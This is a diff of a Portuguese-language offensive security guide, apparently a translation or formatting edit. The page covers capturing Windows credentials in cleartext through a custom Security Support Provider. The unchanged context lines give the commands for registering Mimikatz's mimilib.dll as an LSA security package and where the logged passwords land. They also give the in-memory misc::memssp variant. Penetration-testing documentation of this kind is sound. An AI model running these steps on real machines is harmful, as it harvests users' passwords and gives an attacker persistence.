@@ -10,7 +10,7 @@ Você pode criar seu **próprio SSP** para **capturar** em **texto claro** as **
 #### Mimilib
 
 Você pode usar o binário `mimilib.dll` fornecido pelo Mimikatz. **Isso registrará em um arquivo todas as credenciais em texto claro.**\
-Coloque a dll em `C:\Windows\System32\`\
+Coloque o dll em `C:\Windows\System32\`\
 Obtenha uma lista de Pacotes de Segurança LSA existentes:
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
@@ -19,7 +19,7 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
 Adicione `mimilib.dll` à lista de Provedores de Suporte de Segurança (Pacotes de Segurança):
-```powershell
+```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
 E após uma reinicialização, todas as credenciais podem ser encontradas em texto claro em `C:\Windows\System32\kiwissp.log`
@@ -27,7 +27,7 @@ E após uma reinicialização, todas as credenciais podem ser encontradas em tex
 #### Em memória
 
 Você também pode injetar isso na memória diretamente usando Mimikatz (note que pode ser um pouco instável/não funcionar):
-```powershell
+```bash
 privilege::debug
 misc::memssp
 ```
